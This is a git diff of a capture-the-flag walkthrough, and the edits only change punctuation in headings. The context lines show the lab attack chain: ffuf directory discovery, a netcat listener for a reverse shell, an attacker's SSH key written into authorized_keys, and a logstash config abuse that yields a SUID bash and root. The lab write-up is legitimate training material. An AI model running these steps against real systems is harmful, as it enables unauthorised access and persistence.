@@ -32,7 +32,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 └─$ telnet <IP> 23 
 ```
-### I found a secret path with fuff
+### I found a secret path with fuff.
 ```bash
 http://10.10.101.61:48151/temporary/dev/new/account
 ```
@@ -55,16 +55,16 @@ nc -lnvp 4444
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVHSInmKKk3Z3UHbvtH9LHOnWkDTnKFtoPTRMI2+J+a mariusmarolleau@gmail.com" > authorized_keys
 ```
 
-### linpeas gives me a vulnerability
+### Linpeas gives me a vulnerability.
 cd /etc/logstash/conf.d
 
-### modifie the file in this directory to get a bash with a suid in deadpool's home
+### Modifie the file in this directory to get a bash with a suid in deadpool home.
 
 ```bash
 cd /home/deadpool
 ./bash -p
 ```
-### Got a shell as root
+### Got a shell as root.
 
 ## Root FLAG
 
